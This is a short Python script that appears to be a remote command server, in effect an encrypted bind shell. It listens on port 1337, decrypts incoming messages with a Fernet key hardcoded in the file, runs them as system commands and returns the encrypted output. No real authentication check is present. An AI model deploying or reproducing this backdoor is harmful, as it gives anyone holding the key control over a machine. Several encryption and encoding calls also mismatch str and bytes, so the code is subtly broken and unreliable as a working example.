import socket
import subprocess
from cryptography.fernet import Fernet


key = b'TQenjgBHJFv6Ep4v8eN0Bayf194BS6qV_X23n5ulnRQ='

def server_program():
    # get the hostname
    host = socket.gethostname()
    port = 1337  # initiate port no above 1024

    server_socket = socket.socket()  # get instance
    # look closely. The bind() function takes tuple as argument
    server_socket.bind((host, port))  # bind host address and port together

    # configure how many client the server can listen simultaneously
    server_socket.listen(1)
    conn, address = server_socket.accept()  # accept new connection
    print("Connection from: " + str(address))
    
    f = Fernet(key)

    while True:
        # receive data stream. it won't accept data packet greater than 1024 bytes
        data = conn.recv(1024).decode()
        if not data:
            # if data is not received break
            break
        data = f.decrypt(str(data))
        print("from connected user: " + str(data))
        command = str(data)
        
        # before running commands auth using AES
        # we need a private key
        
        result = subprocess.run(command.split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout_output = result.stdout.decode("utf-8")
        stderr_output = result.stderr.decode("utf-8")
        res = f.encrypt(stdout_output)
        conn.send(res.encode())  # send data to the client

    conn.close()  # close the connection


if __name__ == '__main__':
    server_program()